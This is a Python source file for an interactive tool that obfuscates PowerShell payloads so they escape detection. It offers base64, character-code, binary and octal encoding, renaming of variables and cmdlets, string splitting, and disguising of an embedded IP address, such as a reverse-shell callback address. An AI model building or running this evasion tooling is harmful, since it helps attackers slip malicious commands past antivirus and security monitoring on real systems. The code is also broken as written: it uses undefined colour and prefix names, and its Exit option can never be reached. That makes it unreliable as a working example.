import base64
import re
from uuid import uuid4
import random
import string


class c:
    O = '\033[93m'  # orange
    Y = '\u001b[33m'  # yellow
    R = '\033[1;31m'  # red
    G =  '\033[38;5;82m'  # green  
    RS = '\033[0m'  # default color
    UND = "\033[4m"  # underline
    bold  = '\033[1m'
    alt = "[*]"
    add = "[+]"
    error = f"{O}error{RS}"
    info = f"[{G}info{RS}]"



class Obfuscate:
    def __init__(self):
        self.payload = ""
        self.defaultPayload = ""
  

    def base64Encode(self,payload):
        payloadEncoded = base64.b64encode(payload.encode("utf-16le")).decode()
        return payloadEncoded
        
    def asciiEncode(self,payload):
        encodedPayload = ', '.join(str(ord(c)) for c in payload)
        encodedPayload = "[cHAr[]](" + encodedPayload + ")" + "-JOiN '' |INvOkE-EXPreSSIoN"
        return encodedPayload
        
    def binaryEncode(self,payload):
        encodedPayload = [str(bin(ord(c)))[2:] for c in payload]
        encodedPayload = "[STRInG]::jOIn('' , ('" + ','.join(encodedPayload) + "'-spLIT '@'-SpLIt ','-spLIt'Y'-sPliT 'W' -SPLIT '~' -spLiT'R'-SPliT 'N'-sPLIT 'E' -spLIt 'p'-SPLIt 'l'| forEaCH-OBjEcT{( [CONVert]::toInt16(($_.tOsTrinG() ),2 )-as [chaR])} )) | . ( $verbOSePReFeReNCE.tOSTRIng()[1,3]+'x'-joiN'')"
        return encodedPayload
        
    def octalEncode(self,payload):
        encodedPayload = [str(oct(ord(c)))[2:] for c in payload]
        encodedPayload = "&( $enV:comSPeC[4,24,25]-join'') ( [strInG]::joiN( '',( ( " + ' ,'.join(encodedPayload) + " ) | FOReach-oBjEcT{ ( [CONVeRT]::TOinT16( ($_.ToSTRIng() ), 8)-AS [ChAR])})))"
        return encodedPayload
    


    def variableRename(self,payload):
        usedVarNames = []
        
        findVariable = re.findall('\$[a-zA-Z0-9_]*[\ ]{0,}=', payload)
        findVariable.sort(key=len)
        findVariable.reverse()

        for var in findVariable:
            var = var.strip("\n \r\t=")
            
            while True:
                
                newVarName = uuid4().hex
                    
                if (newVarName in usedVarNames) or (re.search(newVarName, payload)):
                    continue
                        
                else:
                    usedVarNames.append(newVarName)
                    break	
                                
            payload = payload.replace(var, f'${newVarName}')

        return payload
    
    
    
    def findCmdlets(self,payload):
        findCmdlets = r'[A-Z][a-zA-Z]*-[A-Za-z]*'
        cmdlets = re.findall(findCmdlets, payload)
        
        return cmdlets 

    def cmdletToAscii(self,payload):
        cmdlets = self.findCmdlets(payload)
        
        for token in cmdlets:
            asciiTokenValue = [ord(c) for c in token]
            obfuscatedToken = "&([string]::join('',((" + ','.join(map(str, asciiTokenValue)) + ")|%{([char][int]$_)})))"
            payload = payload.replace(token, obfuscatedToken)
            
        return payload

    def cmdletConcatenation(self,payload):
        cmdlets = self.findCmdlets(payload)
        
        for token in cmdlets:
            parts = [f"'{token[i:i + len(token)//4]}'" for i in range(0, len(token), len(token)//4)]
            obfuscatedToken = ".(" + " + ".join(parts) + ")"
            payload = payload.replace(token, obfuscatedToken)
        
        return payload
    
    
    
    
    
    def findMethods(self,payload):
        findMethod = r'\.[A-Z][a-zA-Z0-9_]*'
        methods = re.findall(findMethod, payload)
        methods = [method[1:] for method in methods]
        
        return methods


    def methodConcatenation(self,payload):
        invalidMethods = []
        validMethod = []

        findNamespace = r'(?<=\s|\()[A-Z][a-zA-Z0-9_.]*'
        namespaces = re.findall(findNamespace, payload)

        namespaces = [word.split('.') for word in namespaces if word.count('.') >= 2]

        for namespace in namespaces:
            invalidMethods.extend(namespace)

        methods = self.findMethods(payload)

        for method in methods:
            if method not in invalidMethods:
                validMethod.append(method)

        for method in validMethod:
            step = len(method) // 4 if len(method) >= 4 else 1
            parts = [f"'{method[i:i + step]}'" for i in range(0, len(method), step)]
            obfuscatedMethod = "(" + "+".join(parts) + ")"
            payload = payload.replace(method, obfuscatedMethod)

        return payload
    
    
    



    def findStrings(self,payload):
        findString = r"'(.*?)'"
        strings = re.findall(findString, payload)
        
        return strings


    def stringConcatenation(self,payload):
        strings = self.findStrings(payload)
        
        for string in strings:
            step = len(string) // 4 if len(string) >= 4 else 1
            parts = [f"'{string[i:i + step]}'" for i in range(0, len(string), step)]
            concatenatedString = "(" + "+".join(parts) + ")"
            payload = payload.replace(f"'{string}'", concatenatedString)
    
        return payload        
    
    
    def stringToAscii(self,payload):
        stringChars = []

        strings = self.findStrings(payload)
        
        for string in strings:
            string = ''.join(string)  
            stringChars = []  
            
            for origChar in string:
                stringChars.append(f"$([char]{ord(origChar)})")
                    
            asciiString = '+'.join(stringChars).strip()
            payload = payload.replace(f"'{string}'", f"({asciiString})")  
            
        return payload
    
    
    
    def adressObfuscation(self,payload):
        
        ipAddress = re.search(r'\d+\.\d+\.\d+\.\d+', payload).group()
        validIpAddres = ipAddress.split('.') 

        randomStringSet = [''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 25))) for _ in range(4)] # Generate a list length  4 elements of random strings
        stage1 = '.'.join(randomStringSet)
            
        stage2 = [f".replace('{ro}',{vo})" for ro, vo in zip(randomStringSet, validIpAddres)] # Create the replacement strings
        
        random.shuffle(stage2) # Randomly order the replacement strings
        
        newAddress = f"'{stage1}'{''.join(stage2)}" 
    
        payload = payload.replace(f"'{ipAddress}'", newAddress) 
        
        return payload


    def setPayload(self):
        
        while True:
            self.payload  = input(f"\n{ADD} Enter payload: ")
            self.defaultPayload = self.payload
            
            if len(self.payload) == 0:
                print(f"{ALERT} Payload cannot be empty")
                continue
            
            else:
                print(f"\n{ADD} Default payload: {YELLOW}{self.payload}{RST}", )
                self.menu()
                
                
    def menu(self):
        
        while True:
            options = """
            
    1. Base64 Encode
    2. ASCII Encode
    3. Binary Encode
    4. Octal Encode
    5. Variable rename
    6. Cmdlets concatenation
    7. Cmdlets to ASCII
    8. Method concatenation
    9. String concatenation
    10. String to ASCII
    11. Address Obfuscation
    12. Reset Payload
    13. New Payload
    14. Exit
            
    """
            
            print(options)
            
            choice = int(input("\nSelect obfuscated method: "))
            
            if choice == 1:
                self.payload = self.base64Encode(self.payload)  
                
            elif choice == 2:
                self.payload = self.asciiEncode(self.payload)  
                
            elif choice == 3:
                self.payload = self.binaryEncode(self.payload)  
                
            elif choice == 4:
                self.payload = self.octalEncode(self.payload)  
                
            elif choice == 5:
                self.payload = self.variableRename(self.payload)  
                
            elif choice == 6:
                self.payload = self.cmdletConcatenation(self.payload)  
                
            elif choice == 7:
                self.payload = self.cmdletToAscii(self.payload)
                
            elif choice == 8:
                self.payload = self.methodConcatenation(self.payload)  
                
            elif choice == 9:
                self.payload = self.stringConcatenation(self.payload)  
                
            elif choice == 10:
                self.payload = self.stringToAscii(self.payload)  
                
            elif choice == 11:
                self.payload = self.adressObfuscation(self.payload)
                
            elif choice == 12:
                self.payload = self.defaultPayload
                print(f"\n{ADD} Obfuscation techniques removed")
                                
            elif choice == 13:
                self.setPayload()
                
            elif choice == 13:
                break
                
            else:
                print("Invalid choice")
            
            print(f"\n{ADD} Payload: {YELLOW}{self.payload.strip()}{RST}" )
            
            payloadLength = len(self.payload)
            if payloadLength > 8190:
                print("\nThis command exceeds the cmd.exe maximum length of 8190.")
            


def main():
    obfuscate = Obfuscate()
    obfuscate.setPayload()
    obfuscate.menu()


if __name__ == "__main__":
    main()